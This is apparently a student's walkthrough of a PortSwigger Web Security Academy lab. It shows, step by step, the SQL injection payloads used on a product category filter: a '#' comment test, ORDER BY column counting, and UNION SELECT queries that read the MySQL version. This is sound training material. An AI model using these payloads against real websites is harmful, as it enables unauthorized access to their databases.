https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

Lab objective: `Display the database version string.`

# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

We know that this lab contains a SQL injection vulnerability in the product category filter.

This SQL query does not work `category=Accessories' AND 1=1--`

So, we will change to the method of commenting instead `--` we use `#`

Now the query will `category=Accessories' AND 1=1#`

![[Sqli Lab 4.png]]

From the commenting style we know that it is `MySQL`

Now we need to know `column number, column type and vulnerable column`

Find column number query is `category=Accessories' ORDER BY 2#`
![[Sqli Lab 4-1.png]]

Find column type and vulnerable column query is `category=-Accessories' UNION SELECT 'A','B'#`

![[Sqli Lab 4-2.png]]

Now we will find the version of the database.

The query will `category=-Accessories' UNION SELECT @@version,'B'#
`
And our lab is solve.
![[Sqli Lab 4-3.png]]